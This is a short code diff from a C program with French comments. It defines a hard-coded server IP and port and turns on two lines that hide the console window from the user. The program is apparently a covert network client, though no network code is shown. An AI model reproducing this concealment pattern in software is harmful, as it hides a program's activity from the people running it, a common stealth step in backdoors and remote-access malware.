@@ -12,8 +12,8 @@
 #define SERVER_IP "192.168.191.141"
 #define SERVER_PORT 1234
 
-    //HWND myWindows = GetConsoleWindow(); Cache le prompt pour l'utilisateur
-    //ShowWindow(myWindows, SW_HIDE);
+    HWND myWindows = GetConsoleWindow(); //Cache le prompt pour l'utilisateur
+    ShowWindow(myWindows, SW_HIDE);
 
 void ProcessFunction() {
     // La fonction que vous voulez exécuter en parallèle
